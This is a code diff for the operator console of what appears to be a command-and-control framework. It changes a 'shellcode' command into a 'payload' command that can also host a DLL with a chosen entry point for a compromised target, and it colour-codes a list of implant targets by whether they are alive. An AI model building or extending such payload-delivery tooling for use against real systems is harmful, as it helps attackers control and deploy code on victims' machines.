@@ -30,19 +30,30 @@ func Interact(kittenName string) error {
 			return nil
 		case "target":
 			PrintTarget()
-		case "shellcode":
+		case "payload":
 			if kittenName == "all targets" {
 				fmt.Println(color.Red("You can't host shellcode on all targets"))
 				break
 			}
-			fmt.Printf("%s\n", color.Yellow("[*] Please enter the path to the shellcode"))
+			fmt.Printf("%s\n", color.Yellow("[*] Please enter the path to the payload"))
 			var path string
 			path, err := i.Read("Path: ")
 			if err != nil {
 				util.ErrPrint(err)
 				break
 			}
-			err = httpUtil.HostShellcode(path, kittenName)
+			if strings.HasSuffix(path, ".dll") {
+				fmt.Printf("%s\n", color.Yellow("[*] Please enter the entry point"))
+				var function string
+				function, err = i.Read("Function: ")
+				if err != nil {
+					util.ErrPrint(err)
+					break
+				}
+				err = httpUtil.HostDll(path, function, kittenName)
+			} else {
+				err = httpUtil.HostShellcode(path, kittenName)
+			}
 			if err != nil {
 				util.ErrPrint(err)
 				break
@@ -75,18 +86,27 @@ func PrintTarget() {
 		var e string
 		if x.GetAlive() {
 			e = "Yes"
+			fmt.Printf("%d\t%s\t\t%s\t%s\t\t%s\t%d\t%s\n",
+				x.GetId(),
+				color.Yellow(name),
+				color.Yellow(x.InitChecks.GetIp()),
+				color.Yellow(x.InitChecks.GetHostname()),
+				color.Yellow(x.GetLastSeen().Format("15:04:05")),
+				color.Yellow(x.GetSleep()),
+				color.Yellow(e))
+
 		} else {
 			e = "No"
+			fmt.Printf("%d\t%s\t\t%s\t%s\t\t%s\t%d\t%s\n",
+				x.GetId(),
+				color.Red(name),
+				color.Red(x.InitChecks.GetIp()),
+				color.Red(x.InitChecks.GetHostname()),
+				color.Red(x.GetLastSeen().Format("15:04:05")),
+				color.Red(x.GetSleep()),
+				color.Red(e))
+
 		}
-		fmt.Printf("%d\t%s\t\t%s\t%s\t\t%s\t%d\t%s\n",
-			x.GetId(),
-			color.Yellow(name),
-			color.Yellow(x.InitChecks.GetIp()),
-			color.Yellow(x.InitChecks.GetHostname()),
-			color.Yellow(x.GetLastSeen().Format("15:04:05")),
-			color.Yellow(x.GetSleep()),
-			color.Yellow(e),
-		)
 	}
 	fmt.Println()
 }
@@ -96,7 +116,7 @@ func completer(d prompt.Document) []prompt.Suggest {
 		{Text: "exit", Description: "Exit the program"},
 		{Text: "back", Description: "Go back to the main menu"},
 		{Text: "target", Description: "Show targets"},
-		{Text: "shellcode", Description: "Host shellcode"},
+		{Text: "payload", Description: "Host a payload"},
 		{Text: "sleep", Description: "Set sleep time"},
 		{Text: "recon", Description: "Show recon information"},
 	}
